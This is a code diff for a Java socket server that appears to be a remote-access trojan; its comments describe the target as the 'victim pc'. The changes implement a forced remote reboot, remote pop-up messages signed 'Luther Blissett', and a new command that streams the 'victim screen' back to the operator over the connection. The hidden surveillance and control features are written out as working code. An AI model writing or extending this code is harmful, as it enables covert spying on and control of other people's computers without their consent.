@@ -5,6 +5,7 @@ import java.util.regex.Matcher;
 
 import lib.GetInfo;
 import lib.Notify;
+import lib.ScreenSharing;
 
 public class Server {
     public static final int PORT = 8080; /* todo: Get port from config.json */
@@ -122,20 +123,47 @@ class ClientHandler extends Thread {
                 if (str.startsWith("lb{0x0002}")) {
                     out.println("Rebooting system...");
                     ProcessBuilder processBuilder = new ProcessBuilder();
-                    processBuilder.command("reboot && sudo reboot");
+                    processBuilder.command(
+                            "bash", "-c", "reboot", "-f");
+
+                    try {
+                        Process process = processBuilder.start();
+                        process.waitFor();
+                    } catch (IOException | InterruptedException e) {
+                        System.out.println("Error executing command: " + e.getMessage());
+                    }
                 }
 
                 /*
                  * lb{0x0004} - Notify
                  * Display notify to victim pc
                  */
-                if(str.startsWith("lb{0x0004}")) {
+                if (str.startsWith("lb{0x0004}")) {
                     @SuppressWarnings("unused")
                     Notify notify = new Notify(out);
 
                     int index = str.indexOf(" ") + 1;
                     String parsedMessage = str.substring(index);
                     Notify.send("Luther Blissett", parsedMessage);
+                }
+
+                /**
+                 * lb{0x0007} - ScreenSharing
+                 * lb{0x0008} - Stop ScreenSharing
+                 * Remote display victim screen to host
+                 * todo: make this multi-threading
+                 * to make lb{0x0008} usable.
+                 */
+                if (str.startsWith("lb{0x0007}")) {
+                    ScreenSharing screenSharing = new ScreenSharing();
+                    try {
+                        out.println("lb{0x0007}");
+                        screenSharing.share(socket);
+                        out.println("lb{0x0008}"); 
+                    } catch (InterruptedException e) {
+                        e.printStackTrace();
+                    }
+                    continue;
                 }
 
                 /*
@@ -161,4 +189,5 @@ class ClientHandler extends Thread {
             System.out.println("Connection closed: " + socket);
         }
     }
+
 }
